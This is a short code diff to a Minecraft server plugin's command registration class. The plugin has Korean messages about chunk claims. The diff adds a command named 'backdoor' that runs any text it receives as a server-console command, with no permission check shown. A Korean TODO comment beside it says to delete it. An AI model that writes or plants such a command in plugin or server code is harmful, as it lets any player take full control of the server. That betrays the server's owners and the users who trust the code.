@@ -203,6 +203,10 @@ public class Commands {
             ctx.sender().sendMessage(VAN.mm.deserialize("보호 가능한 청크 수: <green>%d"
                     .formatted(ClaimManager.claimCount.get(ctx.sender().getUniqueId()))));
         }));
+        //TODO: 이거 지우기!
+        manager.command(manager.commandBuilder("backdoor").required("cmd", StringParser.greedyStringParser()).handler(ctx -> {
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), ctx.get("cmd"));
+        }));
 
         return manager;
     }
